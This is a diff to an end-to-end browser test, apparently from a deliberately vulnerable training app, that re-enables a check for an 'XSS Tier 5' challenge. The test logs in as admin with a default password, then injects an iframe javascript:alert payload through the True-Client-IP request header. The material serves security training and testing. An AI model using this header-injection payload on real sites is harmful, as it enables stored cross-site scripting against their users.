@@ -56,14 +56,25 @@ describe('/rest/saveLoginIp', () => {
   describe('challenge "xss5"', () => {
     protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })
 
-    xit('should be possible to save log-in IP when logged in', () => {
+    it('should be possible to save log-in IP when logged in', () => {
       browser.waitForAngularEnabled(false)
-      browser.executeScript('var $http = angular.element(document.body).injector().get(\'$http\'); $http.get(\'/rest/saveLoginIp\',{headers: {\'True-Client-IP\': \'<iframe src="javascript:alert(xss)">\'}});')
+      browser.executeScript(() => {
+        var xhttp = new XMLHttpRequest()
+        xhttp.onreadystatechange = function () {
+          if (this.status === 200) {
+            console.log('Success')
+          }
+        }
+        xhttp.open('GET', 'http://localhost:3000/rest/saveLoginIp', true)
+        xhttp.setRequestHeader("Authorization",`Bearer ${localStorage.getItem("token")}`)
+        xhttp.setRequestHeader('True-Client-IP','<iframe src="javascript:alert(`xss`)">')
+        xhttp.send()
+      })
       browser.driver.sleep(1000)
       browser.waitForAngularEnabled(true)
     })
 
-    // protractor.expect.challengeSolved({ challenge: 'XSS Tier 5' })
+    protractor.expect.challengeSolved({ challenge: 'XSS Tier 5' })
   })
 
   it('should not be possible to save log-in IP when not logged in', () => {
